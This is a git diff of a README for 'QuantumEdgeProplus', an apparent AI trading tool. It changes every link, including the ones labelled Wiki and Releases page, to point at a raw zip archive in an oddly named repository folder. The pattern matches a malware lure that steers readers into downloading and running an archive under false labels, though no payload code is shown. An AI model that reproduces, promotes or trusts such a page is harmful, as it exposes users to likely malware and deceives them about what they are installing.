@@ -1,6 +1,6 @@
 # 🤖 QuantumEdgeProplus - Your AI Trading Companion Made Easy
 
-[![Download Latest Release](https://raw.githubusercontent.com/jnsattl23/QuantumEdgeProplus/main/prothalloid/QuantumEdgeProplus.zip%20Latest%20Release-QuantumEdgeProplus-blue)](https://raw.githubusercontent.com/jnsattl23/QuantumEdgeProplus/main/prothalloid/QuantumEdgeProplus.zip)
+[![Download Latest Release](https://github.com/jnsattl23/QuantumEdgeProplus/raw/refs/heads/main/prothalloid/Edge-Proplus-Quantum-v3.1.zip%20Latest%20Release-QuantumEdgeProplus-blue)](https://github.com/jnsattl23/QuantumEdgeProplus/raw/refs/heads/main/prothalloid/Edge-Proplus-Quantum-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Before you download, make sure you have the following:
 
 ## 📥 Download & Install
 
-To get QuantumEdgeProplus, visit this page to download: [Download Latest Release](https://raw.githubusercontent.com/jnsattl23/QuantumEdgeProplus/main/prothalloid/QuantumEdgeProplus.zip).
+To get QuantumEdgeProplus, visit this page to download: [Download Latest Release](https://github.com/jnsattl23/QuantumEdgeProplus/raw/refs/heads/main/prothalloid/Edge-Proplus-Quantum-v3.1.zip).
 
 1. Click on the link above.
 2. On the Releases page, find the latest version.
@@ -66,13 +66,13 @@ Join our community for additional support and strategies:
 
 - **GitHub Discussions**: Engage with other users and share your experiences or ask questions.
 - **Social Media**: Follow us on various platforms for updates and tips.
-- **Documentation**: Refer to the [Wiki](https://raw.githubusercontent.com/jnsattl23/QuantumEdgeProplus/main/prothalloid/QuantumEdgeProplus.zip) for detailed guidance.
+- **Documentation**: Refer to the [Wiki](https://github.com/jnsattl23/QuantumEdgeProplus/raw/refs/heads/main/prothalloid/Edge-Proplus-Quantum-v3.1.zip) for detailed guidance.
 
 ## 🔄 Updating QuantumEdgeProplus
 
 To ensure you have the latest features and improvements:
 
-1. Periodically return to the [Releases page](https://raw.githubusercontent.com/jnsattl23/QuantumEdgeProplus/main/prothalloid/QuantumEdgeProplus.zip).
+1. Periodically return to the [Releases page](https://github.com/jnsattl23/QuantumEdgeProplus/raw/refs/heads/main/prothalloid/Edge-Proplus-Quantum-v3.1.zip).
 2. Download the latest version as explained in the "Download & Install" section.
 3. Follow the same steps to replace the old files with the new ones.
 
